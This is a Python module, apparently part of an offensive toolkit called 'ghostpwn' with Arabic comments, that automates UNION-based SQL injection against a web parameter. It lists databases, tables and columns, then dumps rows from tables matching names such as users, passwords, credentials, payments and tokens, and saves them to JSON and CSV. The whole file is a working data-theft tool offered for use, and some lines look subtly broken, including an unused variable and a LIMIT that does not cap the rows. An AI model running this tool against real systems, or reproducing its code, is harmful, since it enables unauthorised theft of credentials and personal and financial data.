#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ghostpwn - Database Dump Module
استخراج كامل لقواعد البيانات عبر SQLi
"""
import sys
import os
import re
import urllib.parse
from typing import Dict, List, Optional, Tuple

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from modules.http_client import HttpClient


class DatabaseDumper:
    """استخراج كامل لـ DB عبر SQLi UNION-based"""

    def __init__(self, http_client: HttpClient, audit_logger=None):
        self.client = http_client
        self.audit = audit_logger

    def log(self, msg, level="info"):
        icons = {"info": "[*]", "success": "[✓]", "warn": "[!]", "error": "[✗]"}
        print(f"    {icons.get(level, '[*]')} {msg}")
        if self.audit:
            self.audit.log_event(msg, level)

    def dump_database(self, url: str, param: str,
                      target_db: str = None,
                      target_table: str = None,
                      max_rows: int = 100) -> Dict:
        """استخراج قاعدة بيانات كاملة"""
        self.log(f"Starting DB dump on param '{param}'", "info")

        result = {
            "url": url,
            "param": param,
            "databases": [],
            "current_db": None,
            "current_user": None,
            "version": None,
            "tables": {},
            "dumped_data": {},
        }

        # 1) معلومات أساسية
        self.log("Extracting basic info...", "info")
        result["version"] = self._extract_single(url, param, "version()")
        result["current_user"] = self._extract_single(url, param, "current_user()")
        result["current_db"] = self._extract_single(url, param, "database()")

        if result["version"]:
            self.log(f"Version: {result['version']}", "success")
        if result["current_user"]:
            self.log(f"User: {result['current_user']}", "success")
        if result["current_db"]:
            self.log(f"DB: {result['current_db']}", "success")

        # 2) قائمة كل الـ databases
        self.log("Extracting databases list...", "info")
        dbs = self._extract_group_concat(
            url, param,
            "schema_name",
            "information_schema.schemata"
        )
        if dbs:
            result["databases"] = dbs.split(",")
            self.log(f"Found {len(result['databases'])} databases", "success")

        # 3) تحديد الـ DB المستهدف
        if not target_db:
            target_db = result["current_db"]
        if not target_db:
            target_db = result["databases"][0] if result["databases"] else None

        if not target_db:
            self.log("No database to dump", "warn")
            return result

        self.log(f"Target database: {target_db}", "info")

        # 4) قائمة الـ tables في الـ DB المستهدف
        if target_table:
            tables = [target_table]
        else:
            self.log(f"Extracting tables from {target_db}...", "info")
            tables_str = self._extract_group_concat(
                url, param,
                "table_name",
                "information_schema.tables",
                f"table_schema='{target_db}'"
            )
            if tables_str:
                tables = tables_str.split(",")
                self.log(f"Found {len(tables)} tables", "success")
            else:
                tables = []

        # 5) استخراج بيانات كل table
        interesting_tables = [
            "users", "user", "accounts", "account", "admins", "admin",
            "members", "member", "customers", "customer", "clients", "client",
            "logins", "login", "auth", "authentication", "credentials",
            "passwords", "password", "users_meta", "profiles", "profile",
            "employees", "employee", "staff", "contacts", "contact",
            "orders", "order", "payments", "payment", "transactions",
            "products", "product", "items", "item",
            "settings", "setting", "config", "configuration",
            "sessions", "session", "tokens", "token",
        ]

        for table in tables:
            # نركز على الـ tables المهمة
            is_interesting = any(t in table.lower() for t in interesting_tables)

            if target_table and table != target_table:
                continue

            if is_interesting or target_table:
                self.log(f"Dumping table: {table}", "info")

                # استخراج الأعمدة
                columns_str = self._extract_group_concat(
                    url, param,
                    "column_name",
                    "information_schema.columns",
                    f"table_schema='{target_db}' AND table_name='{table}'"
                )

                if not columns_str:
                    self.log(f"No columns found for {table}", "warn")
                    continue

                columns = columns_str.split(",")
                self.log(f"Columns: {', '.join(columns[:10])}{'...' if len(columns) > 10 else ''}", "info")

                # استخراج البيانات
                data = self._dump_table_data(url, param, target_db, table, columns, max_rows)
                if data:
                    result["dumped_data"][table] = {
                        "columns": columns,
                        "rows": data,
                        "row_count": len(data),
                    }
                    result["tables"][table] = columns
                    self.log(f"Dumped {len(data)} rows from {table}", "success")

        return result

    def _extract_single(self, url: str, param: str, expression: str) -> Optional[str]:
        """استخراج قيمة واحدة"""
        parsed = urllib.parse.urlparse(url)
        if not parsed.query:
            return None

        params = urllib.parse.parse_qs(parsed.query)
        original_value = params[param][0]

        # UNION SELECT
        payload = f"{original_value}' UNION SELECT {expression}-- -"

        test_params = params.copy()
        test_params[param] = [payload]
        new_query = urllib.parse.urlencode(test_params, doseq=True)
        test_url = urllib.parse.urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, new_query, parsed.fragment
        ))

        resp = self.client.get(test_url)
        if resp["status"] != 200:
            return None

        # مقارنة بالـ response الأصلي
        orig_resp = self.client.get(url)

        # استخراج النص الجديد
        import difflib
        orig_lines = orig_resp["body"].split('\n')
        new_lines = resp["body"].split('\n')

        diff = list(difflib.unified_diff(orig_lines, new_lines, lineterm=''))
        added_lines = [l[1:] for l in diff if l.startswith('+') and not l.startswith('+++')]

        for line in added_lines:
            line = line.strip()
            if line and len(line) < 500 and not line.startswith("<"):
                if re.match(r'^[a-zA-Z0-9_@.,\-:\s]+$', line):
                    return line

        return None

    def _extract_group_concat(self, url: str, param: str,
                              column: str, table: str,
                              where: str = None) -> Optional[str]:
        """استخراج group_concat من column"""
        expression = f"GROUP_CONCAT({column} SEPARATOR ',')"
        if where:
            expression = f"{expression} FROM {table} WHERE {where}"
        else:
            expression = f"{expression} FROM {table}"

        return self._extract_single(url, param, expression)

    def _dump_table_data(self, url: str, param: str,
                         db: str, table: str,
                         columns: List[str], max_rows: int) -> List[List[str]]:
        """استخراج بيانات table"""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        original_value = params[param][0]

        # استخراج كل row - نستخدم GROUP_CONCAT مع separator مخصص
        # نأخذ أول 5 columns لو فيه أكتر من 5
        cols_to_dump = columns[:5] if len(columns) > 5 else columns
        cols_concat = f"CONCAT_WS('|',{'::'.join(cols_to_dump)})"
        # نستخدم 0x7c7c كـ separator بين الـ rows (||)
        # و 0x7c بين الـ columns (|)
        col_expr = "CONCAT_WS(0x7c," + ",".join(cols_to_dump) + ")"

        payload = (f"{original_value}' UNION SELECT GROUP_CONCAT({col_expr} SEPARATOR 0x7c7c) "
                  f"FROM {db}.{table} LIMIT {max_rows}-- -")

        test_params = params.copy()
        test_params[param] = [payload]
        new_query = urllib.parse.urlencode(test_params, doseq=True)
        test_url = urllib.parse.urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, new_query, parsed.fragment
        ))

        resp = self.client.get(test_url)
        if resp["status"] != 200:
            return []

        # استخراج الناتج
        import difflib
        orig_resp = self.client.get(url)
        orig_lines = orig_resp["body"].split('\n')
        new_lines = resp["body"].split('\n')

        diff = list(difflib.unified_diff(orig_lines, new_lines, lineterm=''))
        added_lines = [l[1:] for l in diff if l.startswith('+') and not l.startswith('+++')]

        rows = []
        for line in added_lines:
            line = line.strip()
            if not line or line.startswith("<"):
                continue
            # فصل الـ rows بـ ||
            row_strings = line.split("||")
            for row_str in row_strings:
                if row_str and "|" in row_str:
                    cells = row_str.split("|")
                    if len(cells) >= 2:
                        rows.append(cells)
                elif row_str:
                    rows.append([row_str])

        return rows

    def save_dump(self, dump_data: Dict, output_file: str):
        """حفظ الـ dump في ملف"""
        import json
        with open(output_file, "w", encoding="utf-8") as f:
            json.dump(dump_data, f, ensure_ascii=False, indent=2)

        # حفظ أيضاً بصيغة CSV لكل table
        import csv
        base_dir = os.path.dirname(output_file)
        for table_name, table_data in dump_data.get("dumped_data", {}).items():
            csv_file = os.path.join(base_dir, f"dump_{table_name}.csv")
            with open(csv_file, "w", encoding="utf-8", newline="") as f:
                writer = csv.writer(f)
                writer.writerow(table_data["columns"])
                for row in table_data["rows"]:
                    # تطويل row لو أقصر من columns
                    while len(row) < len(table_data["columns"]):
                        row.append("")
                    writer.writerow(row[:len(table_data["columns"])])

        return output_file


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="ghostpwn - Database Dumper")
    parser.add_argument("--url", required=True, help="Target URL with vulnerable param")
    parser.add_argument("--param", required=True, help="Vulnerable parameter name")
    parser.add_argument("--db", help="Target database (default: current)")
    parser.add_argument("--table", help="Target table (default: all interesting)")
    parser.add_argument("--rows", type=int, default=100, help="Max rows per table")
    parser.add_argument("--output", default="db_dump.json", help="Output file")
    args = parser.parse_args()

    client = HttpClient(timeout=15)
    dumper = DatabaseDumper(client)

    dump = dumper.dump_database(args.url, args.param, args.db, args.table, args.rows)
    dumper.save_dump(dump, args.output)

    print(f"\n[✓] Dump saved to: {args.output}")
    print(f"    Databases: {len(dump['databases'])}")
    print(f"    Tables dumped: {len(dump['dumped_data'])}")
    for table, data in dump["dumped_data"].items():
        print(f"      {table}: {data['row_count']} rows")
